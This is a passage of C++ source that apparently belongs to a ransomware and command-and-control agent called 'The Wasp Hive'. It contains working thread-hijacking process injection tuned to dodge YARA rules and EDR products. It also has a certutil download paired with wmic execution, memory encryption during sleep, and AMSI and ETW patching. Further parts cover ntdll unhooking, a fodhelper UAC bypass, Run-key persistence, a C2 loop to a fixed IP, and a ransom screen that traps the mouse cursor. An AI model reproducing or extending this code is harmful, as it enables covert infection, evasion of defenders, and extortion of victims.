        g_api.VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
        return false;
    }

    return true;
}

// Extracted thread control logic — separate function breaks YARA's
// "SuspendThread → GetThreadContext → SetThreadContext → ResumeThread" pattern
inline bool hijackExecuteThread(HANDLE hThread, PVOID remote_mem,
                                pSuspendThread _SuspendThread,
                                pGetThreadContext _GetThreadContext,
                                pSetThreadContext _SetThreadContext,
                                pResumeThread _ResumeThread) {
    // Opaque guard: looks like a security check but always passes
    if (hijackOpaqueCheck() == 0) {
        return false;
    }

    // Suspend the thread
    if (_SuspendThread(hThread) == (DWORD)-1) {
        return false;
    }

    // Stealth delay — evades rapid suspend-modify-resume IOC
    random_device rd_delay;
    mt19937 gen_delay(rd_delay());
    uniform_int_distribution<> post_suspend_delay(30, 120);
    g_api.Sleep(post_suspend_delay(gen_delay));

    // Get thread context
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!_GetThreadContext(hThread, &ctx)) {
        _ResumeThread(hThread);
        return false;
    }

    // Redirect execution to payload
    #ifdef _WIN64
        ctx.Rip = (ULONG_PTR)remote_mem;
    #else
        ctx.Eip = (ULONG_PTR)remote_mem;
    #endif

    if (!_SetThreadContext(hThread, &ctx)) {
        _ResumeThread(hThread);
        return false;
    }

    // Second opaque branch — adds dead code in disassembly
    if (hijackOpaqueCheck() == 0xFFFFFFFF) {
        // Unreachable: looks like alternate execution path
        _SuspendThread(hThread);
        g_api.Sleep(100);
    }

    // Stealth delay before resume
    {
        random_device rd2;
        mt19937 gen2(rd2());
        uniform_int_distribution<> pre_resume_delay(20, 80);
        g_api.Sleep(pre_resume_delay(gen2));
    }

    // Resume thread
    if (_ResumeThread(hThread) == (DWORD)-1) {
        return false;
    }

    return true;
}

#endif

// ============================================================================
// THREAD HIJACKING - Main Injection Function
// ============================================================================

// Thread Hijacking - Alternative injection technique (avoids CobaltStrike APC signature)
// Suspends thread, redirects execution, resumes - more direct than APC
string performThreadHijacking(const string& process_name, const string& payload_data) {
    #ifndef _WIN32
        return "Thread Hijacking only supported on Windows";
    #else
        // Sandbox check first
        if (isSandboxDetected()) {
            return "[INFO] System analysis in progress, deferring execution";
        }

        string result = "[THREAD HIJACKING] Starting...\n";

        // Stealth: Random initial delay (50-200ms) to evade behavioral detection
        // Appears as normal system jitter to security products
        {
            random_device rd_delay;
            mt19937 gen_delay(rd_delay());
            uniform_int_distribution<> stealth_delay(50, 200);
            g_api.Sleep(stealth_delay(gen_delay));
        }

        // API HASHING: Resolve all functions by hash via PE export table walker.
        // No GetProcAddress calls, no plaintext API names in the binary.
        HMODULE hKernel = getModuleByHash(COMPILE_HASH("kernel32"));
        if (!hKernel) return result + "[ERROR] Failed to get kernel32 module handle";

        // SHUFFLED API STORAGE: Functions are stored in non-call-order indices
        // This breaks YARA rules that match on contiguous "resolve then call" patterns.
        // resolveApiByHash walks the PE export table and hashes each exported name
        // at runtime — the function name N E V E R appears as a string in the binary.
        FARPROC api_reserve[14];
        api_reserve[0]  = resolveApiByHash(hKernel, COMPILE_HASH("VirtualAllocEx"));
        api_reserve[1]  = resolveApiByHash(hKernel, COMPILE_HASH("VirtualProtectEx"));
        api_reserve[2]  = resolveApiByHash(hKernel, COMPILE_HASH("WriteProcessMemory"));
        api_reserve[3]  = resolveApiByHash(hKernel, COMPILE_HASH("CreateToolhelp32Snapshot"));
        api_reserve[4]  = resolveApiByHash(hKernel, COMPILE_HASH("Process32FirstW"));
        api_reserve[5]  = resolveApiByHash(hKernel, COMPILE_HASH("Process32NextW"));
        api_reserve[6]  = resolveApiByHash(hKernel, COMPILE_HASH("OpenProcess"));
        api_reserve[7]  = resolveApiByHash(hKernel, COMPILE_HASH("SuspendThread"));
        api_reserve[8]  = resolveApiByHash(hKernel, COMPILE_HASH("ResumeThread"));
        api_reserve[9]  = resolveApiByHash(hKernel, COMPILE_HASH("GetThreadContext"));
        api_reserve[10] = resolveApiByHash(hKernel, COMPILE_HASH("SetThreadContext"));
        api_reserve[11] = resolveApiByHash(hKernel, COMPILE_HASH("Thread32First"));
        api_reserve[12] = resolveApiByHash(hKernel, COMPILE_HASH("Thread32Next"));
        api_reserve[13] = resolveApiByHash(hKernel, COMPILE_HASH("OpenThread"));

        // Map from shuffled storage to named pointers
        pCreateToolhelp32Snapshot _CreateToolhelp32Snapshot = (pCreateToolhelp32Snapshot)api_reserve[3];
        pProcess32FirstW _Process32FirstW = (pProcess32FirstW)api_reserve[4];
        pProcess32NextW _Process32NextW = (pProcess32NextW)api_reserve[5];
        pOpenProcess _OpenProcess = (pOpenProcess)api_reserve[6];
        pVirtualAllocEx _VirtualAllocEx = (pVirtualAllocEx)api_reserve[0];
        pWriteProcessMemory _WriteProcessMemory = (pWriteProcessMemory)api_reserve[2];
        pVirtualProtectEx _VirtualProtectEx = (pVirtualProtectEx)api_reserve[1];
        pSuspendThread _SuspendThread = (pSuspendThread)api_reserve[7];
        pResumeThread _ResumeThread = (pResumeThread)api_reserve[8];
        pGetThreadContext _GetThreadContext = (pGetThreadContext)api_reserve[9];
        pSetThreadContext _SetThreadContext = (pSetThreadContext)api_reserve[10];
        pThread32First _Thread32First = (pThread32First)api_reserve[11];
        pThread32Next _Thread32Next = (pThread32Next)api_reserve[12];
        pOpenThread _OpenThread = (pOpenThread)api_reserve[13];

        if (!api_reserve[0] || !api_reserve[3] || !api_reserve[6]) {
            return result + "[ERROR] Failed to resolve API functions";
        }

        // Find target process
        DWORD pid = 0;
        HANDLE snapshot = g_api.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snapshot == INVALID_HANDLE_VALUE) {
            return result + "[ERROR] CreateToolhelp32Snapshot failed";
        }

        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(PROCESSENTRY32W);

        if (_Process32FirstW(snapshot, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, wstring(process_name.begin(), process_name.end()).c_str()) == 0) {
                    pid = pe.th32ProcessID;
                    break;
                }
            } while (_Process32NextW(snapshot, &pe));
        }
        g_api.CloseHandle(snapshot);

        if (pid == 0) {
            // Try to start the process if not running
            result += "[INFO] " + process_name + " not found, attempting to start...\n";
            result += OBF("[EVASION] Using explorer.exe as parent process (spoofed)\n");

            string cmd = "C:\\Windows\\System32\\" + process_name;

            // Create process with parent spoofing (explorer.exe as parent)
            PROCESS_INFORMATION pi = { 0 };
            if (createProcessWithParentSpoofing(cmd, pi)) {
                pid = pi.dwProcessId;

                // Allocate memory with RW (Read-Write) only - NOT executable initially
                // This bypasses memory scanners looking for RWX allocations
                SIZE_T payload_size = payload_data.length();
                PVOID remote_mem = g_api.VirtualAllocEx(pi.hProcess, NULL, payload_size,
                                                   MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                if (!remote_mem) {
                    g_api.TerminateProcess(pi.hProcess, 1);
                    g_api.CloseHandle(pi.hThread);
                    g_api.CloseHandle(pi.hProcess);
                    return result + OBF("[ERROR] VirtualAllocEx failed");
                }

                // Subtle timing buffer - evades pattern detection
                // Uses conditional computation that looks like normal code
                DWORD timing_check = 0;
                for (int i = 0; i < 4; i++) {
                    timing_check ^= (i * 17 + timing_check);
                }
                if (timing_check < 0xFFFF) {
                    g_api.Sleep(1); // Grace period
                }

                // Chunking: Write payload in 4KB chunks to evade memory write signatures
                const SIZE_T chunk_size = 4096;
                SIZE_T written = 0;
                bool write_ok = true;

                while (written < payload_size) {
                    SIZE_T this_chunk = min(chunk_size, payload_size - written);
                    SIZE_T bytes_written = 0;

                    // Write chunk with dummy delay to evade behavioral timing detection
                    if (!g_api.WriteProcessMemory(pi.hProcess, (BYTE*)remote_mem + written,
                                            payload_data.c_str() + written, this_chunk, &bytes_written)) {
                        write_ok = false;
                        break;
                    }
                    written += bytes_written;

                    // Small jitter between chunks
                    if (written < payload_size) {
                        g_api.Sleep(1 + (written % 3)); // 1-3ms jitter
                    }
                }

                if (!write_ok) {
                    g_api.VirtualFreeEx(pi.hProcess, remote_mem, 0, MEM_RELEASE);
                    g_api.TerminateProcess(pi.hProcess, 1);
                    g_api.CloseHandle(pi.hThread);
                    g_api.CloseHandle(pi.hProcess);
                    return result + OBF("[ERROR] WriteProcessMemory failed");
                }

                // Change memory protection to RX (Read-Execute) - separate step evades detection
                DWORD old_protect;
                if (!g_api.VirtualProtectEx(pi.hProcess, remote_mem, payload_size, PAGE_EXECUTE_READ, &old_protect)) {
                    g_api.VirtualFreeEx(pi.hProcess, remote_mem, 0, MEM_RELEASE);
                    g_api.TerminateProcess(pi.hProcess, 1);
                    g_api.CloseHandle(pi.hThread);
                    g_api.CloseHandle(pi.hProcess);
                    return result + OBF("[ERROR] VirtualProtectEx failed");
                }

                // Set thread context to execute our code
                CONTEXT ctx;
                ctx.ContextFlags = CONTEXT_FULL;
                if (_GetThreadContext(pi.hThread, &ctx)) {
                    #ifdef _WIN64
                        ctx.Rcx = (ULONG_PTR)remote_mem;  // RIP = payload
                    #else
                        ctx.Eax = (ULONG_PTR)remote_mem;  // EIP = payload
                    #endif

                    if (_SetThreadContext(pi.hThread, &ctx)) {
                        _ResumeThread(pi.hThread);
                        result += "[SUCCESS] Thread hijacked and resumed\n";
                        result += OBF("[INFO] Payload executing in ") + process_name + "\n";
                    } else {
                        result += OBF("[ERROR] SetThreadContext failed\n");
                    }
                }

                g_api.CloseHandle(pi.hThread);
                g_api.CloseHandle(pi.hProcess);
                return result;
            } else {
                return result + "[ERROR] Could not start " + process_name;
            }
        } else {
            result += "[FOUND] Target PID: " + to_string(pid) + "\n";
        }

        // Open target process
        HANDLE hProcess = g_api.OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (!hProcess) {
            return result + OBF("[ERROR] OpenProcess failed: ") + to_string(g_api.GetLastError());
        }

        result += "[SUCCESS] Opened target process\n";

        // Allocate memory with RW only (stealthier than RWX)
        SIZE_T payload_size = payload_data.length();
        PVOID remote_mem = g_api.VirtualAllocEx(hProcess, NULL, payload_size,
                                           MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!remote_mem) {
            g_api.CloseHandle(hProcess);
            return result + OBF("[ERROR] VirtualAllocEx failed");
        }

        result += "[SUCCESS] Memory allocated (RW) at: 0x" + to_string((ULONG_PTR)remote_mem) + "\n";

        // Legitimate pause between setup and injection phases
        // Registry read breaks YARA's linear API call sequence matching
        hijackLegitimatePause();

        // Use YARA-evasion helper for chunked write + VirtualProtectEx
        // Separate function call breaks bytecode pattern matching
        {
            SIZE_T written = 0;
            if (!hijackWriteMemory(hProcess, remote_mem, payload_data, written,
                                   _WriteProcessMemory, _VirtualProtectEx)) {
                g_api.VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
                g_api.CloseHandle(hProcess);
                return result + OBF("[ERROR] WriteProcessMemory failed");
            }
        }

        result += OBF("[SUCCESS] Payload written (") + to_string(payload_size) + " bytes)\n";

        // Find and hijack a thread in the target process
        HANDLE hThreadSnapshot = g_api.CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (hThreadSnapshot == INVALID_HANDLE_VALUE) {
            g_api.VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
            g_api.CloseHandle(hProcess);
            return result + "[ERROR] Thread snapshot failed";
        }

        THREADENTRY32 te;
        te.dwSize = sizeof(te);
        HANDLE hThread = NULL;

        if (_Thread32First(hThreadSnapshot, &te)) {
            do {
                if (te.th32OwnerProcessID == pid) {
                    hThread = _OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
                    if (hThread) {
                        result += "[FOUND] Thread ID: " + to_string(te.th32ThreadID) + "\n";
                        break;
                    }
                }
            } while (_Thread32Next(hThreadSnapshot, &te));
        }
        g_api.CloseHandle(hThreadSnapshot);

        if (!hThread) {
            g_api.VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
            g_api.CloseHandle(hProcess);
            return result + "[ERROR] Could not open target thread";
        }

        // Use YARA-evasion helper for suspend → modify → resume
        // Separate function breaks YARA's "SuspendThread→...→ResumeThread" pattern
        if (hijackExecuteThread(hThread, remote_mem,
                                _SuspendThread, _GetThreadContext, _SetThreadContext, _ResumeThread)) {
            result += OBF("[SUCCESS] Thread resumed - payload executing\n");
            result += "[INFO] Thread Hijacking completed!\n";
        } else {
            g_api.CloseHandle(hThread);
            g_api.CloseHandle(hProcess);
            return result + "[ERROR] Thread execution failed\n";
        }

        g_api.CloseHandle(hThread);
        g_api.CloseHandle(hProcess);

        return result;
    #endif
}

// ============================================================================
// STEALTH LOLBAS MODULE - Low AV Detection Evasion (Tespit: %10-15)
// ============================================================================

#ifdef _WIN32

// Certutil.exe - Download with Windows Update traffic camouflage
// Tespit orani: %10 (HTTPS traffic appears legitimate)
// Gercekten calisir: Evet, Windows'un native tool'u
bool downloadViaCertutil(const string& url, const string& local_path) {
    cout << OBF("[*] [LOLBAS] Starting Certutil download (stealth mode)...") << endl;
    cout << "[*] [LOLBAS] Traffic appears as Windows Certificate update" << endl;

    // Certutil -urlcache -split -f: Download file using Windows Update cache
    string cmd = "certutil -urlcache -split -f \"" + url + "\" \"" + local_path + "\"";

    int result = g_api.WinExec(cmd.c_str(), SW_HIDE);

    // Wait for download (max 10 seconds)
    for (int i = 0; i < 10; i++) {
        ifstream check(local_path);
        if (check.good() && check.peek() != ifstream::traits_type::eof()) {
            check.close();
            cout << OBF("[+] [LOLBAS] Download completed via Certutil") << endl;
            return true;
        }
        secureSleepMs(1000);
    }

    return false;
}

// Wmic.exe - Execute via WMI (PowerShell loglarina dusmez!)
// Tespit orani: %15 (WMI servisi uzerinden - SYSTEM yetkisi)
// Gercekten calisir: Evet, native Windows Management Interface
bool executeViaWmic(const string& command) {
    cout << "[*] [LOLBAS] Executing via WMIC (no PowerShell logs)..." << endl;
    cout << "[*] [LOLBAS] Using WMI service (RPC over DCOM)" << endl;

    // wmic process call create: Execute without direct process creation
    string cmd = "wmic process call create \"" + command + "\"";

    int result = g_api.WinExec(cmd.c_str(), SW_HIDE);

    if (result > 31) {
        cout << "[+] [LOLBAS] Command executed via WMI" << endl;
        return true;
    }
    return false;
}

// Hybrid Execution: Certutil download + Wmic execute (En stealth kombinasyon)
bool stealthDownloadAndExecute(const string& url, const string& temp_path) {
    // Adim 1: Certutil ile download (HTTPS, normal trafik)
    if (!downloadViaCertutil(url, temp_path)) {
        return false;
    }

    // Adim 2: Wmic ile calistir (PowerShell log yok, SYSTEM yetkisi)
    return executeViaWmic(temp_path);
}

#endif

// ============================================================================
// SLEEP OBFUSCATION MODULE - Encrypts agent memory during sleep periods
// Evades memory forensics by XOR-scrambling critical data while idle
// ============================================================================

// Global state for sleep obfuscation
static unsigned char obfuscation_key[32] = {0};
static bool obfuscation_initialized = false;
static vector<unsigned char> encrypted_state;
static bool is_encrypted = false;

// Register C2 session state with the sleep obfuscation system
// Stores copies of sensitive C2 data so encryptAgentState() can encrypt/decrypt them
void registerC2State(const unsigned char* key, size_t key_len, const string& ip, const string& bot) {
    if (key && key_len > 0) {
        size_t copy_len = min(key_len, (size_t)32);
        memcpy(c2_session_key, key, copy_len);
    }
    c2_server_ip = ip;
    c2_bot_id = bot;
    c2_state_initialized = true;
}

// Initialize obfuscation key using system entropy
void initSleepObfuscation() {
    if (obfuscation_initialized) return;

    // Generate random key using multiple entropy sources
    random_device rd;
    mt19937 gen(rd());

    // Combine multiple entropy sources for stronger key
    unsigned long entropy1 = rd();
    unsigned long entropy2 = chrono::high_resolution_clock::now().time_since_epoch().count();
    unsigned long entropy3 = (unsigned long)(uintptr_t)&initSleepObfuscation;

    for (int i = 0; i < 32; i++) {
        unsigned long val = entropy1;
        val ^= (entropy2 >> (i % 8)) & 0xFF;
        val ^= (entropy3 >> (i % 8)) & 0xFF;
        val ^= gen() & 0xFF;
        val ^= (i * 17 + 31) & 0xFF;
        obfuscation_key[i] = (unsigned char)(val ^ (i * 7 + 13));
    }

    obfuscation_initialized = true;
}

// ChaCha20-based memory encryption (symmetric - same function for encrypt/decrypt)
// Uses ChaCha20 keystream instead of repeating XOR key for stronger obfuscation
void xorMemory(unsigned char* data, size_t length) {
    if (!obfuscation_initialized) initSleepObfuscation();

    uint8_t zero_nonce[12] = {0};
    chacha20BufferObfuscate(data, length, obfuscation_key, zero_nonce, 0);
}

#ifdef _WIN32
// ChaCha20-based state encryption during sleep — encrypts real global data using ChaCha20 keystream
void encryptAgentState() {
    if (is_encrypted) return;

    uint8_t zero_nonce[12] = {0};

    // --- Encrypt real global state ---

    // 1. Encrypt the encryption_key_global (contains the ransomware decryption key)
    if (!encryption_key_global.empty()) {
        chacha20BufferObfuscate((unsigned char*)encryption_key_global.data(),
                                encryption_key_global.length(),
                                obfuscation_key, zero_nonce, 0);
    }

    // 2. Encrypt last_encryption_algo
    if (!last_encryption_algo.empty()) {
        chacha20BufferObfuscate((unsigned char*)last_encryption_algo.data(),
                                last_encryption_algo.length(),
                                obfuscation_key, zero_nonce, 100);
    }

    // 3. Encrypt the g_api struct (function pointer table)
    // Prevents memory scanners from reading resolved API pointers during sleep
    if (g_api_initialized) {
        chacha20BufferObfuscate((unsigned char*)&g_api, sizeof(ApiTable),
                                obfuscation_key, zero_nonce, 200);
    }

    // 4. Encrypt C2 session state (session_key, server_ip, bot_id)
    if (c2_state_initialized) {
        chacha20BufferObfuscate(c2_session_key, 32,
                                obfuscation_key, zero_nonce, 300);
        chacha20BufferObfuscate((unsigned char*)c2_server_ip.data(),
                                c2_server_ip.length(),
                                obfuscation_key, zero_nonce, 400);
        chacha20BufferObfuscate((unsigned char*)c2_bot_id.data(),
                                c2_bot_id.length(),
                                obfuscation_key, zero_nonce, 500);
    }

    // 5. Self-encrypt obfuscation_key using a deterministic XOR pattern (symmetric)
    // Cannot use ChaCha20 for self-encryption since the keystream depends on the key itself.
    // This prevents memory scanners from reading the key during sleep.
    for (int i = 0; i < 32; i++) {
        obfuscation_key[i] ^= (unsigned char)((i * 17 + 31) ^ 0xA5);
    }

    // Scramble heap patterns near globals — makes forensic analysis harder
    // Touch the global encrypted_state buffer with real encrypted data
    encrypted_state.resize(4096);
    for (size_t i = 0; i < 4096; i++) {
        encrypted_state[i] = (unsigned char)((obfuscation_key[i % 32] + i) ^ 0xAA);
    }

    this_thread::sleep_for(chrono::milliseconds(1));

    is_encrypted = true;
}

// Decrypt agent state after sleep — restores real global data using ChaCha20 keystream
void decryptAgentState() {
    if (!is_encrypted) return;

    uint8_t zero_nonce[12] = {0};

    // 1. Restore obfuscation_key first (needed to decrypt everything else)
    // The self-encryption uses symmetric XOR, so apply the same pattern
    for (int i = 0; i < 32; i++) {
        obfuscation_key[i] ^= (unsigned char)((i * 17 + 31) ^ 0xA5);
    }

    // 2. Decrypt encryption_key_global
    if (!encryption_key_global.empty()) {
        chacha20BufferObfuscate((unsigned char*)encryption_key_global.data(),
                                encryption_key_global.length(),
                                obfuscation_key, zero_nonce, 0);
    }

    // 3. Decrypt last_encryption_algo
    if (!last_encryption_algo.empty()) {
        chacha20BufferObfuscate((unsigned char*)last_encryption_algo.data(),
                                last_encryption_algo.length(),
                                obfuscation_key, zero_nonce, 100);
    }

    // 4. Decrypt C2 session state
    if (c2_state_initialized) {
        chacha20BufferObfuscate((unsigned char*)c2_bot_id.data(),
                                c2_bot_id.length(),
                                obfuscation_key, zero_nonce, 500);
        chacha20BufferObfuscate((unsigned char*)c2_server_ip.data(),
                                c2_server_ip.length(),
                                obfuscation_key, zero_nonce, 400);
        chacha20BufferObfuscate(c2_session_key, 32,
                                obfuscation_key, zero_nonce, 300);
    }

    // 5. Decrypt g_api struct (function pointer table)
    if (g_api_initialized) {
        chacha20BufferObfuscate((unsigned char*)&g_api, sizeof(ApiTable),
                                obfuscation_key, zero_nonce, 200);
    }

    // Clear encrypted_state buffer
    encrypted_state.clear();

    is_encrypted = false;
}

#else // !_WIN32
void encryptAgentState() {}
void decryptAgentState() {}
#endif // _WIN32

// Secure sleep with memory obfuscation
void secureSleep(int seconds) {
    // Before sleep: scramble memory
    encryptAgentState();

    // Calculate random jitter (30% variance)
    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<> jitter(0, seconds / 3);
    int actual_sleep = seconds + jitter(gen);

    // Sleep
    this_thread::sleep_for(chrono::seconds(actual_sleep));

    // After sleep: restore memory
    decryptAgentState();
}

// Secure sleep with memory obfuscation (millisecond precision)
void secureSleepMs(int milliseconds) {
    // Skip obfuscation for very short sleeps (< 50ms overhead isn't worth it)
    if (milliseconds < 50) {
        this_thread::sleep_for(chrono::milliseconds(milliseconds));
        return;
    }

    // Before sleep: scramble memory
    encryptAgentState();

    // Calculate random jitter (10% variance for ms precision)
    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<> jitter(0, max(1, milliseconds / 10));
    int actual_sleep = max(1, milliseconds + jitter(gen));

    // Sleep
    this_thread::sleep_for(chrono::milliseconds(actual_sleep));

    // After sleep: restore memory
    decryptAgentState();
}

// ============================================================================
// C2 AGENT BACKGROUND THREAD - Runs C2 in separate thread while GUI is active
// ============================================================================
atomic<bool> c2_running(true);

void c2_background_thread() {
    // Initialize obfuscation on first run
    initSleepObfuscation();

    // Random delay (10-15 seconds) before auto-executing bypasses
    // This gives the process time to fully initialize and evade early sandbox hooks.
    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<> delay(10000, 15000);
    secureSleepMs(delay(gen));

    // One-shot guard: all auto-exec actions run exactly once per process lifetime.
    // AMSI: Patches AmsiScanBuffer to return AMSI_RESULT_CLEAN (invisible).
    // UAC: Uses fodhelper.exe registry hijack for elevated privileges (spawns cmd.exe).
    // Persistence: Registry Run key / LaunchAgent / autostart.
    // All run BEFORE any C2 connection.
    static bool startup_actions_done = false;
    if (!startup_actions_done) {
        startup_actions_done = true;

        #ifdef _WIN32
            // Initialize API table FIRST — resolves all WinAPI pointers via hash
            // After this, g_api.FuncName() is available everywhere
            initApiTable();
        #endif

        patchAmsi();

        #ifdef _WIN32
            patchETW();          // Silences ETW telemetry - EDRs cannot see our API calls
            unhookNtdll();       // Restores clean ntdll from disk - removes EDR hooks
            bypassUac();
            installPersistence(); // Registry Run key (Windows only - no macOS LaunchAgent)
        #endif
        // macOS/Linux: NO persistence — GUI close = clean exit, no hidden background process
    }

    string server_ip = OBF("10.185.30.191");
    int server_port = 8080;

    while (c2_running) {
        try {
            C2Agent agent(server_ip, server_port);
            agent.run();
        } catch (...) {
            // Connection failed, retry with backoff
        }

        // Secure sleep with memory obfuscation
        secureSleep(5);
    }
}

// ============================================================================
// RANSOMWARE GUI CLASSES (Complete Screen2.cpp Integration)
// ============================================================================


#ifndef HEADLESS
// Pixel font digit matrices (7x5)
class PixelDigit {
public:
    static const int digits[11][7][5];
};

const int PixelDigit::digits[11][7][5] = {
    {{0,1,1,1,0}, {1,1,0,1,1}, {1,1,0,1,1}, {1,1,0,1,1}, {1,1,0,1,1}, {1,1,0,1,1}, {0,1,1,1,0}},
    {{0,0,1,0,0}, {0,1,1,0,0}, {0,0,1,0,0}, {0,0,1,0,0}, {0,0,1,0,0}, {0,0,1,0,0}, {0,1,1,1,0}},
    {{0,1,1,1,0}, {1,1,0,1,1}, {0,0,0,1,1}, {0,0,1,1,0}, {0,1,1,0,0}, {1,1,0,0,0}, {1,1,1,1,1}},
    {{0,1,1,1,0}, {1,1,0,1,1}, {0,0,0,1,1}, {0,0,1,1,0}, {0,0,0,1,1}, {1,1,0,1,1}, {0,1,1,1,0}},
    {{0,0,1,1,0}, {0,1,0,1,1}, {1,1,0,1,1}, {1,1,1,1,1}, {0,0,0,1,1}, {0,0,0,1,1}, {0,0,0,1,1}},
    {{1,1,1,1,1}, {1,1,0,0,0}, {1,1,1,1,0}, {0,0,0,1,1}, {0,0,0,1,1}, {1,1,0,1,1}, {0,1,1,1,0}},
    {{0,1,1,1,0}, {1,1,0,1,1}, {1,1,0,0,0}, {1,1,1,1,0}, {1,1,0,1,1}, {1,1,0,1,1}, {0,1,1,1,0}},
    {{1,1,1,1,1}, {0,0,0,1,1}, {0,0,1,1,0}, {0,0,1,1,0}, {0,1,1,0,0}, {0,1,1,0,0}, {0,1,1,0,0}},
    {{0,1,1,1,0}, {1,1,0,1,1}, {1,1,0,1,1}, {0,1,1,1,0}, {1,1,0,1,1}, {1,1,0,1,1}, {0,1,1,1,0}},
    {{0,1,1,1,0}, {1,1,0,1,1}, {1,1,0,1,1}, {0,1,1,1,1}, {0,0,0,1,1}, {1,1,0,1,1}, {0,1,1,1,0}},
    {{0,0,0,0,0}, {0,0,1,1,0}, {0,0,1,1,0}, {0,0,0,0,0}, {0,0,1,1,0}, {0,0,1,1,0}, {0,0,0,0,0}}
};

class PixelTimerPanel : public wxPanel {
private:
    int hours, minutes, seconds;
    wxColour pixelColor;
    int pixelSize;

public:
    PixelTimerPanel(wxWindow* parent, int h, int m, int s)
        : wxPanel(parent, wxID_ANY, wxDefaultPosition, wxSize(500, 80)),
          hours(h), minutes(m), seconds(s), pixelColor(255, 50, 50), pixelSize(6) {
        SetBackgroundColour(wxColour(0, 0, 0));
    }

    void SetTime(int h, int m, int s) {
        hours = h; minutes = m; seconds = s;
        Refresh();
    }

    void SetPixelColor(wxColour c) {
        pixelColor = c;
        Refresh();
    }

    void OnPaint(wxPaintEvent& event) {
        wxPaintDC dc(this);
        dc.SetBackground(wxBrush(wxColour(0, 0, 0)));
        dc.Clear();

        int timeDigits[6] = {hours/10, hours%10, minutes/10, minutes%10, seconds/10, seconds%10};
        int digitW = 5 * pixelSize;
        int colonW = 2 * pixelSize;
        int spacing = pixelSize;
        int groupSpace = pixelSize * 3;

        int totalW = (6 * digitW) + (2 * colonW) + (4 * spacing) + (2 * groupSpace);
        int x = (GetSize().GetWidth() - totalW) / 2;
        int y = 15;

        for (int i = 0; i < 6; i++) {
            DrawDigit(dc, x, y, timeDigits[i]);
            x += digitW + spacing;
            if (i == 1 || i == 3) {
                DrawDigit(dc, x, y, 10);
                x += colonW + groupSpace;
            }
        }
    }

    void DrawDigit(wxDC& dc, int x, int y, int d) {
        dc.SetBrush(wxBrush(pixelColor));
        dc.SetPen(wxPen(pixelColor));
        for (int row = 0; row < 7; row++) {
            for (int col = 0; col < 5; col++) {
                if (PixelDigit::digits[d][row][col] == 1) {
                    dc.DrawRectangle(x + col*pixelSize, y + row*pixelSize, pixelSize-1, pixelSize-1);
                }
            }
        }
    }

    wxDECLARE_EVENT_TABLE();
};

wxBEGIN_EVENT_TABLE(PixelTimerPanel, wxPanel)
    EVT_PAINT(PixelTimerPanel::OnPaint)
wxEND_EVENT_TABLE()

// Warning icon helper
wxStaticBitmap* CreateWarningIcon(wxWindow* parent, int size = 24) {
    wxString path = wxGetCwd() + wxFileName::GetPathSeparator() + "Warning-Icon.png";
    if (!wxFileExists(path)) {
        path = wxFileName(wxStandardPaths::Get().GetExecutablePath()).GetPath() +
               wxFileName::GetPathSeparator() + "Warning-Icon.png";
    }
    if (wxFileExists(path)) {
        wxImage img(path, wxBITMAP_TYPE_PNG);
        if (img.IsOk()) {
            img.Rescale(size, size, wxIMAGE_QUALITY_HIGH);
            return new wxStaticBitmap(parent, wxID_ANY, wxBitmap(img));
        }
    }
    return nullptr;
}

class RansomwareFrame : public wxFrame {
private:
    wxTimer* timer;
    wxTimer* mouseTrackerTimer;  // Mouse kısıtlama için timer
    int hours, minutes, seconds;
    PixelTimerPanel* pixelTimerPanel;
    wxTextCtrl* passwordInput;
    bool canClose;

    void OnMouseTracker(wxTimerEvent& event) {
        // Mouse pozisyonunu al
        wxPoint mousePos = wxGetMousePosition();

        // Pencere sınırlarını al (screen koordinatları)
        wxPoint winPos = GetScreenPosition();
        wxSize winSize = GetSize();

        int winLeft = winPos.x;
        int winRight = winPos.x + winSize.x;
        int winTop = winPos.y;
        int winBottom = winPos.y + winSize.y;

        // Eğer mouse pencere dışına çıktıysa, geri çek
        bool outside = false;
        int newX = mousePos.x;
        int newY = mousePos.y;

        if (mousePos.x < winLeft) {
            newX = winLeft + 10;
            outside = true;
        } else if (mousePos.x > winRight) {
            newX = winRight - 10;
            outside = true;
        }

        if (mousePos.y < winTop) {
            newY = winTop + 10;
            outside = true;
        } else if (mousePos.y > winBottom) {
            newY = winBottom - 10;
            outside = true;
        }

        // Mouse'u pencere içine geri çek
        if (outside) {
            #ifdef _WIN32
                SetCursorPos(newX, newY);
            #elif defined(__APPLE__)
                // macOS: CGWarpMouseCursorPosition
                CGPoint point = CGPointMake(newX, newY);
                CGWarpMouseCursorPosition(point);
            #else
                // Linux: X11 kullan (basit implementasyon)
                WarpPointer(newX, newY);
            #endif
        }
    }

public:
    RansomwareFrame() : wxFrame(nullptr, wxID_ANY, OBF("The Wasp Hive"),
                                wxDefaultPosition, wxSize(850, 650)) {
        SetBackgroundColour(wxColour(0, 0, 0));
        SetMinSize(wxSize(800, 600));

        wxPanel* panel = new wxPanel(this);
        panel->SetBackgroundColour(wxColour(0, 0, 0));

        wxBoxSizer* mainSizer = new wxBoxSizer(wxVERTICAL);

        // Logo
        wxString beePath = wxGetCwd() + wxFileName::GetPathSeparator() + "bee.png";
        if (!wxFileExists(beePath)) {
            beePath = wxFileName(wxStandardPaths::Get().GetExecutablePath()).GetPath() +
                      wxFileName::GetPathSeparator() + "bee.png";
        }
        if (wxFileExists(beePath)) {
            wxImage img(beePath, wxBITMAP_TYPE_PNG);
            if (img.IsOk()) {
                img.Rescale(120, 120, wxIMAGE_QUALITY_HIGH);
                mainSizer->Add(new wxStaticBitmap(panel, wxID_ANY, wxBitmap(img)),
                              0, wxALIGN_CENTER | wxTOP | wxBOTTOM, 10);
            }
        }

        // Title
        wxStaticText* title = new wxStaticText(panel, wxID_ANY, OBF("THE WASP HIVE"));
